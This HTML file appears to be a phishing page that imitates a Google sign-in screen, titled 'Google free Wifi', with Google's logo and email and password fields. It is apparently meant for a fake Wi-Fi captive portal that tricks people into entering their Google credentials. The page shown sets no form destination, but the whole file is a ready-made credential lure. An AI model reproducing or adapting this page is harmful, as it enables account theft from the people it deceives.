<!DOCTYPE html>
    <style> 
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');  
        body { margin: 0; padding: 0; background-size: cover; font-family: 'Open Sans', sans-serif;}
        .box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 25rem; padding: 3.5rem; box-sizing: border-box; border: 1px solid #dadce0; -webkit-border-radius: 8px; border-radius: 8px;  }
        .box h2 { margin: 0px 0 -0.125rem; padding: 0; text-align: center; color: #202124; font-size: 24px; font-weight: 400;}
        .box .logo { display: flex; flex-direction: row; justify-content: center; margin-bottom: 16px;  }
        .box p { font-size: 16px; font-weight: 400; letter-spacing: 1px; line-height: 1.5; margin-bottom: 24px; text-align: center;}
        .box .inputBox { position: relative;}
        .box .inputBox input { width: 93%; padding: 1.3rem 10px; font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px;}
        .box .inputBox label { position: absolute; top: 0; left: 10px; padding: 0.625rem 0; font-size: 1rem; color: gray; pointer-events: none; transition: 0.5s;}
        .box .inputBox input:focus ~ label,.box .inputBox input:valid ~ label,.box .inputBox input:not([value=""]) ~ label { top: -1.125rem; left: 10px; color: #1a73e8; font-size: 0.75rem; background-color: #fff; height: 10px; padding-left: 5px; padding-right: 5px;}
        .box .inputBox input:focus { outline: none; border: 2px solid #1a73e8;}
        .box input[type="submit"] { border: none; outline: none; color: #fff; background-color: #1a73e8; padding: 0.625rem 1.25rem; cursor: pointer; border-radius: 0.312rem; font-size: 1rem; float: right;  }
        .box input[type="submit"]:hover { background-color: #287ae6; box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);  }
    </style>
    <html lang="en">
        <head> 
            <meta charset="UTF-8"> 
            <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
            <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
            <title>Google Form</title> <
            link rel="stylesheet" href="google.css">
        </head>
    <body>  
        <div class="box">  
            <div class="logo">
                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
            </div>  
        <h2>Google free Wifi</h2> 
        <p>Sign In with your Google Account</p> 
        <form>  
            <div class="inputBox">
                <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value=""> 
                <label>Username</label>
            </div>  
            <div class="inputBox">  
                <input type="password" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">  
                <label>Password</label>
            </div>  
            <input type="submit" name="sign-in" value="Sign In">
        </form> 
    </div>  
    </body>
</html>
